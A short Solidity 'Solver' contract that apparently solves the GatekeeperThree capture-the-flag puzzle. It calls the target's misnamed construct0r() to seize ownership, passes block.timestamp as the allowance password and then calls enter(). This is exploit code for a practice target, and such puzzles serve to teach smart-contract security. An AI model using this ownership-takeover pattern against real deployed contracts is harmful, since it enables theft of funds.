// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IGatekeeperThree} from "src/IGatekeeperThree.sol";

contract Solver {

    IGatekeeperThree public target;

    constructor(IGatekeeperThree ttarget) {
        target = ttarget;
    }

    function solve() public {
        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);
        target.enter();
    }
}
